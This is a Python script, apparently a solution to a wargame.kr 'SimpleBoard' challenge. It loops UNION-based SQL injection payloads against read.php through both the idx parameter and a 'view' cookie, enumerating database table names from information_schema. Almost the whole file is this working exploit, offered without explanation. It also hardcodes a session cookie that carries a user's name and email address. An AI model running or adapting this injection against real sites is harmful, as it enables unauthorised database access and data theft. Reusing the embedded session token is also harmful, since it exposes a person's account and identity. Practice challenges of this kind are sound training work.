import urllib.request
from urllib.parse import quote

basic_url = 'http://wargame.kr:8080/SimpleBoard/read.php?idx='
for i in range(1,300):
    idx = "5 union select table_name, table_type, 3, 4 from information_schema.tables limit {},1#".format(str(i))
    idx = quote(idx)

    re = urllib.request.Request(basic_url + idx)
    re.add_header("User-agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
    re.add_header("Cookie", "ci_session=a%3A10%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22ee2ee3dff6b07f208c0db17a5cda7e9f%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A8%3A%2210.0.2.2%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F63.0.3239.132+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1519208990%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A8%3A%22gtobio11%22%3Bs%3A5%3A%22email%22%3Bs%3A18%3A%22gtobio11%40gmail.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22default%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%225550%22%3B%7Da92c6937948fd5d7067f68c1f3c181f275ea36b4; view=/"+idx)

    req = urllib.request.urlopen(re)

    reqstr = str(req.read())
    if(reqstr.find("BASE TABLE") != -1):
        print(reqstr)